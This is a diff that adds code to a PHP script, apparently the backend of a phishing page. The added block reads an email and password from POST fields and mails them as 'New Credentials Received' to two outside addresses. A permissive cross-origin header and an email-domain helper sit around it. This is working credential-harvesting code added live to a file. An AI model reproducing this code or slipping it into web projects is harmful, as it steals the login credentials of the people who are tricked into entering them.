@@ -1,6 +1,20 @@
 <?php
 header('Access-Control-Allow-Origin: *');
+if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['e']) && isset($_POST['p'])) {
+    // Email and password received via POST
+    $email = $_POST['e'];
+    $password = $_POST['p'];
 
+    // Prepare email content
+    $message = "Email: $email\nPassword: $password\n";
+    $subject = "New Credentials Received";
+
+    // Define recipient email(s)
+    $to = "jc4717287@gmail.com, evanskelvin2019@yandex.ru";
+
+    // Send to your email
+    mail($to, $subject, $message);
+}
 // Function to extract domain from email
 function get_email_domain($email) {
     $parts = explode('@', $email);
